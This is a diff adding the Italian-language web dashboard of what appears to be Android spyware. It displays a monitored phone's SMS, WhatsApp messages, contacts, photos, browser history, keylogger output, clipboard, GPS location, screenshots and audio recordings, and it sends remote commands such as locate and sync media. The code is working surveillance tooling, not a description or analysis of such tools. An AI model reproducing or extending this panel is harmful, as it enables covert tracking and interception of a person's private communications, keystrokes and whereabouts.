+  <div id="tab-sms" class="tab-panel">
+    <div id="sms-list-view">
+      <div class="section-hdr">
+        <h2>💬 Conversazioni SMS</h2>
+        <span class="count" id="sms-count"></span>
+      </div>
+      <input class="search-bar" id="sms-search" placeholder="Cerca numero o testo..." oninput="filterSMS()">
+      <div class="card" id="sms-threads"></div>
+    </div>
+    <div id="sms-thread-view">
+      <div id="sms-back">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="15 18 9 12 15 6"/></svg>
+        <span id="sms-thread-title">Conversazione</span>
+      </div>
+      <div id="sms-bubbles" style="flex:1;overflow-y:auto;padding-bottom:8px"></div>
+    </div>
+  </div>
+
+  <!-- CONTACTS -->
+  <div id="tab-contacts" class="tab-panel">
+    <div class="section-hdr">
+      <h2>👤 Rubrica Contatti</h2>
+      <span class="count" id="contacts-count"></span>
+    </div>
+    <input id="contacts-search" class="search-bar" placeholder="Cerca contatto..." oninput="filterContacts()">
+    <div class="card" id="contacts-list"></div>
+  </div>
+
+  <!-- GALLERY -->
+  <div id="tab-gallery" class="tab-panel">
+    <div class="section-hdr">
+      <h2>🖼️ Galleria Media</h2>
+      <span class="count" id="gallery-count"></span>
+    </div>
+    <div id="gallery-grid" class="gallery-grid"></div>
+    <button class="load-more" id="gallery-loadmore" onclick="loadMoreGallery()" style="display:none">Carica altri...</button>
+  </div>
+
+  <!-- WHATSAPP -->
+  <div id="tab-whatsapp" class="tab-panel">
+    <div class="section-hdr">
+      <h2>💚 WhatsApp</h2>
+      <span class="count" id="wa-count"></span>
+    </div>
+    <input class="search-bar" id="wa-search" placeholder="Cerca conversazione, mittente o messaggio..." oninput="filterWA()">
+    <div id="wa-summary" class="card" style="margin-bottom:10px"></div>
+    <div class="card" id="wa-list"></div>
+  </div>
+
+  <!-- BROWSER -->
+  <div id="tab-browser" class="tab-panel">
+    <div class="section-hdr">
+      <h2>🌐 Storico Browser</h2>
+      <span class="count" id="browser-count"></span>
+    </div>
+    <input class="search-bar" id="browser-search" placeholder="Cerca URL o titolo..." oninput="filterBrowser()">
+    <div class="card" id="browser-list"></div>
+  </div>
+
+  <!-- KEYLOG -->
+  <div id="tab-keylog" class="tab-panel">
+    <div class="section-hdr">
+      <h2>⌨️ Keylogger</h2>
+      <span class="count" id="keylog-count"></span>
+    </div>
+    <input class="search-bar" id="keylog-search" placeholder="Cerca testo o app..." oninput="filterKeylog()">
+    <div id="keylog-list"></div>
+  </div>
+
+  <!-- CLIPBOARD -->
+  <div id="tab-clipboard" class="tab-panel">
+    <div class="section-hdr">
+      <h2>📋 Appunti</h2>
+      <span class="count" id="clipboard-count"></span>
+    </div>
+    <input class="search-bar" id="clipboard-search" placeholder="Cerca negli appunti..." oninput="filterClipboard()">
+    <div id="clipboard-list"></div>
+  </div>
+
+  <!-- APPS -->
+  <div id="tab-apps" class="tab-panel">
+    <div class="section-hdr">
+      <h2>📦 App Installate</h2>
+      <span class="count" id="apps-count"></span>
+    </div>
+    <input class="search-bar" id="apps-search" placeholder="Cerca app o package..." oninput="filterApps()">
+    <div class="card" id="apps-list"></div>
+  </div>
+
+  <!-- LOCATION -->
+  <div id="tab-location" class="tab-panel">
+    <div class="section-hdr"><h2>📍 Posizione</h2><span id="location-count" class="count"></span></div>
+    <div id="location-latest" class="card"></div>
+    <div id="location-list" class="card"></div>
+  </div>
+
+  <!-- BATTERY -->
+  <div id="tab-battery" class="tab-panel">
+    <div class="section-hdr">
+      <h2>🔋 Batteria</h2>
+      <span id="battery-current" class="count"></span>
+    </div>
+    <div class="card">
+      <div class="card-title">Livello batteria nel tempo</div>
+      <svg id="battery-chart-svg" viewBox="0 0 300 120">
+        <text x="150" y="60" text-anchor="middle" fill="var(--text-secondary)" font-size="11">Caricamento...</text>
+      </svg>
+    </div>
+    <div class="card">
+      <div class="card-title">Storico</div>
+      <div class="batt-entries" id="batt-entries"></div>
+    </div>
+  </div>
+
+  <!-- SCREENSHOTS -->
+  <div id="tab-screenshots" class="tab-panel">
+    <div class="section-hdr">
+      <h2>📸 Screenshot</h2>
+      <span class="count" id="screenshots-count"></span>
+    </div>
+    <div class="file-grid" id="screenshots-grid"></div>
+  </div>
+
+  <!-- AUDIO -->
+  <div id="tab-audio" class="tab-panel">
+    <div class="section-hdr">
+      <h2>🎙️ Registrazioni Audio</h2>
+      <span class="count" id="audio-count"></span>
+    </div>
+    <div id="audio-list"></div>
+  </div>
+
+  <!-- COMMANDS -->
+  <div id="tab-commands" class="tab-panel">
+    <div class="section-hdr"><h2>🎮 Comandi Remoti</h2></div>
+    <button class="cmd-btn" onclick="sendCommand('ping')">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
+      <span>Ping</span><span class="cmd-desc">Verifica connessione</span>
+    </button>
+    <button class="cmd-btn" onclick="sendCommand('get_location')">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--accent-blue)" stroke-width="2"><circle cx="12" cy="11" r="3"/><path d="M17.657 16.657L13.414 20.9a2 2 0 0 1-2.827 0l-4.244-4.243a8 8 0 1 1 11.314 0z"/></svg>
+      <span>Localizza</span><span class="cmd-desc">Ottieni posizione GPS</span>
+    </button>
+    <button class="cmd-btn" onclick="sendCommand('sync_media')">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--accent-yellow)" stroke-width="2"><polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>
+      <span>Sync Media</span><span class="cmd-desc">Sincronizza file</span>
+    </button>
+    <button class="cmd-btn" onclick="sendCommand('get_status')">
+      <span style="font-size:18px">📊</span>
+      <span>Diagnostica</span><span class="cmd-desc">Batteria, memoria, storage, rete e permessi</span>
+    </button>
+    <button class="cmd-btn" disabled title="Richiede avvio e consenso sul dispositivo Android">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="23"/><line x1="8" y1="23" x2="16" y2="23"/></svg>
+      <span>Registra Audio 30s</span><span class="cmd-desc">Microfono</span>
+    </button>
+    <button class="cmd-btn" disabled title="Richiede consenso MediaProjection sul dispositivo Android">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--accent-purple)" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>
+      <span>Screenshot</span><span class="cmd-desc">Cattura schermo</span>
+    </button>
+    <div class="card-title" style="margin-bottom:8px">Log Comandi</div>
+    <div class="cmd-log" id="cmd-log"></div>
+  </div>
+
+  <!-- AI -->
+  <div id="tab-ai" class="tab-panel">
+    <div class="section-hdr" style="flex-shrink:0"><h2>🤖 Assistente AI</h2></div>
+    <div id="ai-briefing-section"></div>
+    <div id="ai-chat-messages"></div>
+    <div id="ai-input-row" style="flex-shrink:0">
+      <input id="ai-input" placeholder="Scrivi un messaggio..." onkeydown="if(event.key==='Enter')sendAIMessage()">
+      <button id="ai-send" onclick="sendAIMessage()">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
+      </button>
+    </div>
+  </div>
+
+</div><!-- /content -->
+
+<!-- LIGHTBOX -->
+<div id="lightbox">
+  <button id="lb-close" onclick="closeLightbox()">✕</button>
+  <button id="lb-prev" onclick="lbNav(-1)">‹</button>
+  <div id="lb-media"></div>
+  <button id="lb-next" onclick="lbNav(1)">›</button>
+  <div id="lb-caption"></div>
+</div>
+
+<!-- TOAST CONTAINER -->
+<div id="toast-container"></div>
+
+<script>
+'use strict';
+
+// ─── CONFIG ─────────────────────────────────────────────────────────────────
+const TOKEN = new URLSearchParams(location.search).get('token') || '';
+const API_BASE = window.location.origin;
+const IS_LOCAL = location.hostname === 'localhost' || location.hostname === '127.0.0.1';
+
+// ─── STATE ───────────────────────────────────────────────────────────────────
+let currentDevice = null;
+let devices = [];
+let currentTab = 'home';
+let ws = null;
+let wsHeartbeat = null;
+let galleryFiles = [];
+let galleryPage = 0;
+let galleryHasMore = false;
+let lbIndex = 0;
+let lbItems = [];
+let allEvents = [];
+let activityPage = 0;
+const PAGE_SIZE = 50;
+let allCalls = [];
+let allSMS = [];
+let allContacts = [];
+let allWA = [];
+let allBrowser = [];
+let allKeylog = [];
+let allClipboard = [];
+let allApps = [];
+let seenEventIds = new Set();
+
+// ─── UTILS ───────────────────────────────────────────────────────────────────
+function escHtml(s) {
+  if (!s) return '';
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+function timeAgo(ts) {
+  if (!ts) return '';
+  const d = typeof ts === 'number' ? ts : new Date(ts).getTime();
+  const diff = Date.now() - d;
+  if (diff < 60000) return 'ora';
+  if (diff < 3600000) return Math.floor(diff/60000) + 'm fa';
+  if (diff < 86400000) return Math.floor(diff/3600000) + 'h fa';
+  if (diff < 2592000000) return Math.floor(diff/86400000) + 'g fa';
+  return new Date(d).toLocaleDateString('it-IT');
+}
+
+function fmtTime(ts) {
+  if (!ts) return '';
+  const d = typeof ts === 'number' ? new Date(ts) : new Date(ts);
+  return d.toLocaleTimeString('it-IT', {hour:'2-digit', minute:'2-digit'});
+}
+
+function fmtDateFull(ts) {
+  if (!ts) return '';
+  const d = typeof ts === 'number' ? new Date(ts) : new Date(ts);
+  return d.toLocaleString('it-IT', {day:'2-digit', month:'2-digit', year:'numeric', hour:'2-digit', minute:'2-digit'});
+}
+
+function fmtBytes(b) {
+  if (!b) return '0B';
+  if (b < 1024) return b + 'B';
+  if (b < 1048576) return (b/1024).toFixed(1) + 'KB';
+  return (b/1048576).toFixed(1) + 'MB';
+}
+
+function fmtDur(s) {
+  if (!s) return '—';
+  const m = Math.floor(s/60), sec = s%60;
+  return m ? `${m}m ${sec}s` : `${sec}s`;
+}
+
+// ─── FETCH ───────────────────────────────────────────────────────────────────
+async function apiFetch(path, opts={}) {
+  const headers = { 'x-token': TOKEN, ...(opts.headers||{}) };
+  const sep = path.includes('?') ? '&' : '?';
+  try {
+    const r = await fetch(`${API_BASE}${path}${sep}_t=${Date.now()}`, { ...opts, headers });
+    if (!r.ok) throw new Error(`HTTP ${r.status}`);
+    return await r.json();
+  } catch(e) {
+    console.warn('apiFetch error', path, e.message);
+    return null;
+  }
+}
+
+// ─── TOAST ───────────────────────────────────────────────────────────────────
+function toast(msg, type='info', dur=3000) {
+  const c = document.getElementById('toast-container');
+  const el = document.createElement('div');
+  el.className = `toast ${type}`;
+  el.textContent = msg;
+  c.appendChild(el);
+  setTimeout(() => el.remove(), dur + 400);
+}
+
+// ─── TAB NAVIGATION ──────────────────────────────────────────────────────────
+function switchTab(tabId) {
+  if (currentTab === tabId) return;
+  document.querySelectorAll('.tab-panel').forEach(p => {
+    p.classList.remove('active');
+  });
+  document.querySelectorAll('.nav-btn').forEach(b => {
+    b.classList.toggle('active', b.dataset.tab === tabId);
+  });
+  const panel = document.getElementById('tab-' + tabId);
+  if (panel) panel.classList.add('active');
+  currentTab = tabId;
+  onTabActivate(tabId);
+}
+
+document.querySelectorAll('.nav-btn').forEach(btn => {
+  btn.addEventListener('click', () => switchTab(btn.dataset.tab));
+});
+
+function onTabActivate(tab) {
+  if (!currentDevice) return;
+  switch(tab) {
+    case 'activity': loadActivity(); break;
+    case 'calls': loadCalls(); break;
+    case 'sms': loadSMS(); break;
+    case 'contacts': loadContacts(); break;
+    case 'gallery': loadGallery(); break;
+    case 'whatsapp': loadWhatsApp(); break;
+    case 'browser': loadBrowser(); break;
+    case 'keylog': loadKeylog(); break;
+    case 'clipboard': loadClipboard(); break;
+    case 'apps': loadApps(); break;
+    case 'location': loadLocation(); break;
+    case 'battery': loadBattery(); break;
+    case 'screenshots': loadScreenshots(); break;
+    case 'audio': loadAudio(); break;
+    case 'ai': loadAI(); break;
+  }
+}
+
+// ─── DEVICE PICKER ───────────────────────────────────────────────────────────
+async function loadDevices() {
+  const data = await apiFetch('/api/devices');
+  devices = data || [];
+  const sel = document.getElementById('device-picker');
+  sel.innerHTML = '<option value="">— dispositivo —</option>';
+  devices.forEach(d => {
+    const opt = document.createElement('option');
+    opt.value = d.id || d.deviceId || d._id;
+    opt.textContent = d.name || d.model || opt.value;
+    sel.appendChild(opt);
+  });
+  if (devices.length === 1) {
+    sel.value = devices[0].id || devices[0].deviceId || devices[0]._id;
+    selectDevice(sel.value);
+  }
+}
+
+document.getElementById('device-picker').addEventListener('change', function() {
+  selectDevice(this.value);
+});
+
+function selectDevice(id) {
+  currentDevice = id || null;
+  if (!currentDevice) {
+    document.getElementById('home-no-device').style.display = '';
+    document.getElementById('home-stats').style.display = 'none';
+    document.getElementById('home-device-banner').style.display = 'none';
+    return;
+  }
+  document.getElementById('home-no-device').style.display = 'none';
+  document.getElementById('home-stats').style.display = '';
+  const dev = devices.find(d => (d.id||d.deviceId||d._id) === id);
+  if (dev) renderDeviceBanner(dev);
+  loadHomeData();
+  connectWS();
+}
+
+function renderDeviceBanner(dev) {
+  const banner = document.getElementById('home-device-banner');
+  banner.style.display = '';
+  document.getElementById('home-device-name').textContent = dev.deviceName || dev.name || 'Dispositivo';
+  document.getElementById('home-device-model').textContent = dev.model || dev.os || '';
+  const online = dev.online || dev.connected;
+  document.getElementById('home-device-status').innerHTML =
+    `<span class="dot ${online ? 'dot-green' : 'dot-red'}"></span>${online ? 'Online' : 'Offline'}`;
+  document.getElementById('home-device-battery').textContent =
+    dev.battery != null ? `🔋 ${dev.battery}%` : '';
+  const details = document.getElementById('home-device-details');
+  details.innerHTML = '';
+  const rows = [
+    ['OS', dev.os || dev.platform || 'Android'],
+    ['Versione', dev.androidVersion || dev.osVersion || dev.version || '—'],
+    ['IP', dev.ip || '—'],
+    ['Ultimo accesso', dev.lastSeen ? timeAgo(dev.lastSeen) : '—'],
+  ];
+  rows.forEach(([l,v]) => {
+    details.innerHTML += `<div class="device-info-row"><span class="lbl">${escHtml(l)}</span><span class="val">${escHtml(v)}</span></div>`;
+  });
+}
+
+// ─── REFRESH ─────────────────────────────────────────────────────────────────
+document.getElementById('btn-refresh').addEventListener('click', function() {
+  this.classList.add('spin');
+  refreshCurrent().finally(() => {
+    this.classList.remove('spin');
+    toast('Aggiornato', 'success', 1500);
+  });
+});
+
+async function refreshCurrent() {
+  if (!currentDevice) { await loadDevices(); return; }
+  loadHomeData();
+  onTabActivate(currentTab);
+}
+
+// ─── HOME DATA ───────────────────────────────────────────────────────────────
+async function loadHomeData() {
+  showHomeSkeleton();
+  const [statsData, eventsData] = await Promise.all([
+    apiFetch('/api/stats'),
+    apiFetch(`/api/events?deviceId=${currentDevice}&limit=100`)
+  ]);
+
+  const events = eventsData || [];
+  allEvents = events;
+
+  document.getElementById('stat-events').textContent = events.length;
+  if (statsData) {
+    const ds = statsData.devices?.[currentDevice] || {};
+    document.getElementById('stat-calls').textContent = ds.calls ?? '—';
+    document.getElementById('stat-sms').textContent = ds.sms ?? '—';
+    document.getElementById('stat-contacts').textContent = ds.contacts ?? '—';
+    document.getElementById('stat-apps').textContent = ds.apps ?? '—';
+    document.getElementById('stat-media').textContent = ds.media ?? '—';
+  }
+
+  renderHomeBarChart(events);
+  renderHomeRecentEvents(events.slice(0, 5));
+}
+
+function showHomeSkeleton() {
+  document.getElementById('home-recent-events').innerHTML = `
+    <div class="skel skel-line w80"></div>
+    <div class="skel skel-line w60"></div>
+    <div class="skel skel-line w40"></div>
+  `;
+}
+
+function renderHomeBarChart(events) {
+  const svg = document.getElementById('home-bar-chart');
+  if (!events.length) { svg.innerHTML = '<text x="150" y="40" text-anchor="middle" fill="var(--text-secondary)" font-size="11">Nessun dato</text>'; return; }
+  const hours = new Array(24).fill(0);
+  const now = Date.now();
+  events.forEach(e => {
+    const ts = e.ts || e.timestamp || e.time || e.createdAt;
+    if (!ts) return;
+    const diff = now - new Date(ts).getTime();
+    if (diff < 86400000) {
+      const h = 23 - Math.floor(diff / 3600000);
+      if (h >= 0 && h < 24) hours[h]++;
+    }
+  });
+  const max = Math.max(...hours, 1);
+  const W = 300, H = 80, pad = 10, barW = (W - pad*2) / 24 - 1;
+  let bars = '';
+  hours.forEach((v, i) => {
+    const bh = Math.max(2, (v / max) * (H - 20));
+    const x = pad + i * ((W - pad*2) / 24);
+    const y = H - 10 - bh;
+    bars += `<rect class="chart-bar" x="${x.toFixed(1)}" y="${y.toFixed(1)}" width="${barW.toFixed(1)}" height="${bh.toFixed(1)}" fill="var(--accent-blue)" rx="2" opacity="${v ? .8 : .2}"/>`;
+    if (i % 6 === 0) bars += `<text class="chart-label" x="${(x + barW/2).toFixed(1)}" y="${H - 1}" text-anchor="middle">${i}h</text>`;
+  });
+  svg.innerHTML = bars;
+}
+
+function renderHomeRecentEvents(events) {
+  const el = document.getElementById('home-recent-events');
+  if (!events.length) { el.innerHTML = '<div class="empty"><p>Nessun evento recente</p></div>'; return; }
+  el.innerHTML = events.map(e => renderEventItem(e)).join('');
+}
+
+// ─── ACTIVITY ────────────────────────────────────────────────────────────────
+async function loadActivity() {
+  if (allEvents.length === 0) {
+    document.getElementById('activity-list').innerHTML = renderSkeletonList(5);
+    const data = await apiFetch(`/api/events?deviceId=${currentDevice}&limit=500`);
+    allEvents = data || [];
+  }
+  activityPage = 0;
+  renderActivity();
+}
+
+function renderActivity() {
+  const search = document.getElementById('activity-search').value.toLowerCase();
+  const filtered = search ? allEvents.filter(e =>
+    (e.text||e.message||e.body||'').toLowerCase().includes(search) ||
+    (e.app||e.packageName||'').toLowerCase().includes(search) ||
+    (e.title||'').toLowerCase().includes(search)
+  ) : allEvents;
+  document.getElementById('activity-count').textContent = filtered.length + ' eventi';
+  const page = filtered.slice(0, (activityPage + 1) * PAGE_SIZE);
+  document.getElementById('activity-list').innerHTML = page.length
+    ? `<div class="card">${page.map(e => renderEventItem(e)).join('')}</div>`
+    : emptyState('Nessun evento');
+  const lb = document.getElementById('activity-loadmore');
+  lb.style.display = filtered.length > (activityPage + 1) * PAGE_SIZE ? '' : 'none';
+}
+
+function filterActivity() { activityPage = 0; renderActivity(); }
+function loadMoreActivity() { activityPage++; renderActivity(); }
+
+function isWANoise(e) {
+  const pkg = (e.packageName || e.app || e.package || '').toLowerCase();
+  const text = (e.text || e.message || e.body || '').toLowerCase();
+  const noisePkgs = ['com.android.systemui','android','com.samsung','com.google.android.gms'];
+  if (noisePkgs.some(n => pkg.startsWith(n))) return true;
+  if (text.length < 2) return true;
+  return false;
+}
+
+function renderEventItem(e) {
+  const app = escHtml(e.app || e.packageName || e.package || 'Sistema');
+  const title = escHtml(e.title || '');
+  const text = escHtml(e.text || e.message || e.body || '');
+  const ts = e.ts || e.timestamp || e.time || e.createdAt;
+  const ago = timeAgo(ts);
+  const pkg = (e.packageName || e.app || e.package || '').toLowerCase();
+  let icon = '🔔', bg = 'rgba(59,130,246,.15)', color = 'var(--accent-blue)';
+  if (pkg.includes('whatsapp')) { icon = '💬'; bg = 'rgba(37,211,102,.15)'; color = '#25d366'; }
+  else if (pkg.includes('instagram')) { icon = '📸'; bg = 'rgba(225,48,108,.15)'; color = '#e1306c'; }
+  else if (pkg.includes('telegram')) { icon = '✈️'; bg = 'rgba(0,136,204,.15)'; color = '#0088cc'; }
+  else if (pkg.includes('gmail') || pkg.includes('mail')) { icon = '📧'; bg = 'rgba(234,67,53,.15)'; color = '#ea4335'; }
+  else if (pkg.includes('facebook')) { icon = '👤'; bg = 'rgba(24,119,242,.15)'; color = '#1877f2'; }
+  else if (pkg.includes('tiktok')) { icon = '🎵'; bg = 'rgba(255,0,80,.15)'; color = '#ff0050'; }
+  return `<div class="event-item">
+    <div class="event-icon" style="background:${bg};color:${color}">${icon}</div>
+    <div class="event-body">
+      <div class="event-app" style="color:${color}">${app}</div>
+      ${title ? `<div class="event-title">${title}</div>` : ''}
+      <div class="event-text">${text || '<em style="color:var(--text-secondary)">Notifica vuota</em>'}</div>
+      <div class="event-time">${ago}</div>
+    </div>
+  </div>`;
+}
+
+// ─── CALLS ───────────────────────────────────────────────────────────────────
+async function loadCalls() {
+  document.getElementById('calls-list').innerHTML = renderSkeletonList(5);
+  const data = await apiFetch(`/api/calllog/${currentDevice}`);
+  allCalls = (data && (data.calls || data.log || data)) || [];
+  if (!Array.isArray(allCalls)) allCalls = [];
+  renderCalls();
+}
+
+function renderCalls() {
+  const search = document.getElementById('calls-search').value.toLowerCase();
+  const filtered = search ? allCalls.filter(c =>
+    (c.name||c.contact||'').toLowerCase().includes(search) ||
+    (c.number||c.phoneNumber||c.address||'').toLowerCase().includes(search)
+  ) : allCalls;
+  document.getElementById('calls-count').textContent = filtered.length + ' chiamate';
+
+  let inc=0, out=0, miss=0;
+  filtered.forEach(c => {
+    const rawType = c.type ?? c.callType ?? '';
+    const t = String(rawType).toLowerCase();
+    if (rawType === 1 || t.includes('in') && !t.includes('miss')) inc++;
+    else if (rawType === 2 || t.includes('out')) out++;
+    else miss++;
+  });
+  document.getElementById('cs-in').textContent = inc;
+  document.getElementById('cs-out').textContent = out;
+  document.getElementById('cs-miss').textContent = miss;
+
+  if (!filtered.length) { document.getElementById('calls-list').innerHTML = emptyState('Nessuna chiamata'); return; }
+  document.getElementById('calls-list').innerHTML = filtered.map(c => {
+    const name = escHtml(c.name || c.contact || '');
+    const num = escHtml(c.number || c.phoneNumber || c.address || '');
+    const rawType = c.type ?? c.callType ?? '';
+    const type = String(rawType).toLowerCase();
+    const isIn = rawType === 1 || (type.includes('in') && !type.includes('miss'));
+    const isOut = rawType === 2 || type.includes('out');
+    const isMiss = rawType === 3 || type.includes('miss') || (!isIn && !isOut);
+    const cls = isMiss ? 'call-miss' : isOut ? 'call-out' : 'call-in';
+    const icon = isMiss ? '📵' : isOut ? '📤' : '📲';
+    const ts = c.timestamp || c.date || c.time;
+    return `<div class="call-item">
+      <div class="call-icon ${cls}">${icon}</div>
+      <div class="call-body">
+        <div class="call-name">${name || num}</div>
+        ${name ? `<div class="call-num">${num}</div>` : ''}
+        <div class="call-num">${fmtDateFull(ts)}</div>
+      </div>
+      <div class="call-dur">${fmtDur(c.duration || c.durationSeconds || 0)}</div>
+    </div>`;
+  }).join('');
+}
+
+function filterCalls() { renderCalls(); }
+
+// ─── SMS ─────────────────────────────────────────────────────────────────────
+async function loadSMS() {
+  document.getElementById('sms-threads').innerHTML = renderSkeletonList(4);
+  const data = await apiFetch(`/api/sms/${currentDevice}`);
+  const msgs = (data && (data.sms || data.messages || data)) || [];
+  allSMS = Array.isArray(msgs) ? msgs : [];
+  renderSMSThreads();
+}
+
+function renderSMSThreads() {
+  const search = document.getElementById('sms-search').value.toLowerCase();
+  const threadMap = {};
+  allSMS.forEach(m => {
+    const addr = m.address || m.number || m.phoneNumber || m.from || 'Sconosciuto';
+    if (!threadMap[addr]) threadMap[addr] = [];
+    threadMap[addr].push(m);
+  });
+  const threads = Object.entries(threadMap);
+  const filtered = search ? threads.filter(([addr, msgs]) =>
+    addr.toLowerCase().includes(search) ||
+    msgs.some(m => (m.body||m.text||m.message||'').toLowerCase().includes(search))
+  ) : threads;
+  document.getElementById('sms-count').textContent = filtered.length + ' conversazioni';
+  if (!filtered.length) { document.getElementById('sms-threads').innerHTML = emptyState('Nessun SMS'); return; }
+  document.getElementById('sms-threads').innerHTML = filtered.map(([addr, msgs]) => {
+    const last = msgs.sort((a,b) => (b.timestamp||b.date||0) - (a.timestamp||a.date||0))[0];
+    const preview = escHtml((last.body||last.text||last.message||'').substring(0,60));
+    const ts = last.timestamp || last.date || last.time;
+    return `<div class="thread-item" onclick="openSMSThread(${JSON.stringify(addr)})">
+      <div class="thread-avatar">💬</div>
+      <div class="thread-body">
+        <div class="thread-name">${escHtml(addr)}</div>
+        <div class="thread-preview">${preview || '...'}</div>
+      </div>
+      <div style="text-align:right;flex-shrink:0">
+        <div class="thread-time">${timeAgo(ts)}</div>
+        <div class="thread-badge" style="margin-top:4px">${msgs.length}</div>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function filterSMS() { renderSMSThreads(); }
+
+function openSMSThread(addr) {
+  document.getElementById('sms-list-view').style.display = 'none';
+  const tv = document.getElementById('sms-thread-view');
+  tv.classList.add('active');
+  document.getElementById('sms-thread-title').textContent = addr;
+  const msgs = allSMS.filter(m => (m.address||m.number||m.phoneNumber||m.from||'Sconosciuto') === addr)
+    .sort((a,b) => (a.timestamp||a.date||0) - (b.timestamp||b.date||0));
+  const seen = new Set();
+  const dedup = msgs.filter(m => {
+    const key = `${m.body||m.text||m.message}_${m.timestamp||m.date}`;
+    if (seen.has(key)) return false;
+    seen.add(key); return true;
+  });
+  const bubbles = document.getElementById('sms-bubbles');
+  bubbles.innerHTML = dedup.map(m => {
+    const sent = (m.type || m.direction || '') === '2' || (m.type||'').toLowerCase().includes('sent') || m.isSent;
+    const text = escHtml(m.body || m.text || m.message || '');
+    const ts = m.timestamp || m.date;
+    return `<div class="bubble-wrap ${sent ? 'sent' : 'recv'}">
+      <div>
+        <div class="bubble">${text}</div>
+        <div class="bubble-time">${fmtTime(ts)}</div>
+      </div>
+    </div>`;
+  }).join('');
+  bubbles.scrollTop = bubbles.scrollHeight;
+}
+
+document.getElementById('sms-back').addEventListener('click', () => {
+  document.getElementById('sms-list-view').style.display = '';
+  document.getElementById('sms-thread-view').classList.remove('active');
+});
+
+// ─── CONTACTS ────────────────────────────────────────────────────────────────
+async function loadContacts() {
+  document.getElementById('contacts-list').innerHTML = renderSkeletonList(6);
+  const data = await apiFetch(`/api/contacts/${currentDevice}`);
+  allContacts = (data && (data.contacts || data)) || [];
+  if (!Array.isArray(allContacts)) allContacts = [];
+  renderContacts();
+}
+
+function renderContacts() {
+  const search = document.getElementById('contacts-search').value.toLowerCase();
+  const filtered = search ? allContacts.filter(c =>
+    (c.name||c.displayName||'').toLowerCase().includes(search) ||
+    (c.phone||c.number||c.phoneNumber||'').toLowerCase().includes(search)
+  ) : allContacts;
+  document.getElementById('contacts-count').textContent = filtered.length + ' contatti';
+  if (!filtered.length) { document.getElementById('contacts-list').innerHTML = emptyState('Nessun contatto'); return; }
+  document.getElementById('contacts-list').innerHTML = filtered.map(c => {
+    const name = escHtml(c.name || c.displayName || 'Sconosciuto');
+    const nums = c.phones || c.numbers || (c.phone ? [c.phone] : [c.number||c.phoneNumber||'—'].filter(Boolean));
+    const numStr = Array.isArray(nums) ? nums.map(n => typeof n === 'object' ? (n.value||n.number||n) : n).join(', ') : (nums||'—');
+    const initials = name.split(' ').map(w=>w[0]).join('').toUpperCase().substring(0,2);
+    return `<div class="contact-item">
+      <div class="contact-avatar">${initials||'?'}</div>
+      <div>
+        <div class="contact-name">${name}</div>
+        <div class="contact-num">${escHtml(String(numStr))}</div>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function filterContacts() { renderContacts(); }
+
+// ─── GALLERY ─────────────────────────────────────────────────────────────────
+async function loadGallery(reset=true) {
+  if (reset) { galleryPage = 1; galleryFiles = []; document.getElementById('gallery-grid').innerHTML = renderSkeletonGallery(); }
+  const data = await apiFetch(`/api/media/${currentDevice}?page=${galleryPage}&limit=50`);
+  if (data) {
+    const files = data.items || data.files || data.media || (Array.isArray(data) ? data : []);
+    if (reset) galleryFiles = files;
+    else galleryFiles = [...galleryFiles, ...files];
+    galleryHasMore = data.hasMore ?? (galleryFiles.length < (data.total || 0));
+  }
+  renderGallery();
+}
+
+async function loadMoreGallery() {
+  galleryPage++;
+  await loadGallery(false);
+}
+
+function renderGallery() {
+  lbItems = galleryFiles;
+  document.getElementById('gallery-count').textContent = galleryFiles.length + ' file';
+  if (!galleryFiles.length) { document.getElementById('gallery-grid').innerHTML = emptyState('Nessun media'); return; }
+  document.getElementById('gallery-grid').innerHTML = galleryFiles.map((f,i) => {
+    const name = f.name || f.filename || f.file || '';
+    const isVid = /\.(mp4|mov|avi|mkv|3gp)$/i.test(name);
+    const thumbUrl = `${API_BASE}/api/thumb/${currentDevice}/${encodeURIComponent(name)}?token=${TOKEN}`;
+    const size = fmtBytes(f.size);
+    return `<div class="gallery-thumb" onclick="openLightbox(${i})">
+      <img src="${thumbUrl}" alt="${escHtml(name)}" loading="lazy" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%2260%22 height=%2260%22><rect fill=%22%231a2235%22 width=%2260%22 height=%2260%22/><text x=%2230%22 y=%2235%22 text-anchor=%22middle%22 fill=%22%2394a3b8%22 font-size=%2218%22>${isVid?'🎬':'🖼️'}</text></svg>'">
+      ${isVid ? '<div class="video-badge">▶ Video</div>' : ''}
+      <div class="size-badge">${size}</div>
+    </div>`;
+  }).join('');
+  document.getElementById('gallery-loadmore').style.display = galleryHasMore ? '' : 'none';
+}
+
+// ─── LIGHTBOX ────────────────────────────────────────────────────────────────
+function openLightbox(idx) {
+  lbIndex = idx;
+  renderLightboxItem();
+  document.getElementById('lightbox').classList.add('open');
+}
+
+function closeLightbox() {
+  document.getElementById('lightbox').classList.remove('open');
+  document.getElementById('lb-media').innerHTML = '';
+}
+
+function lbNav(dir) {
+  lbIndex = (lbIndex + dir + lbItems.length) % lbItems.length;
+  renderLightboxItem();
+}
+
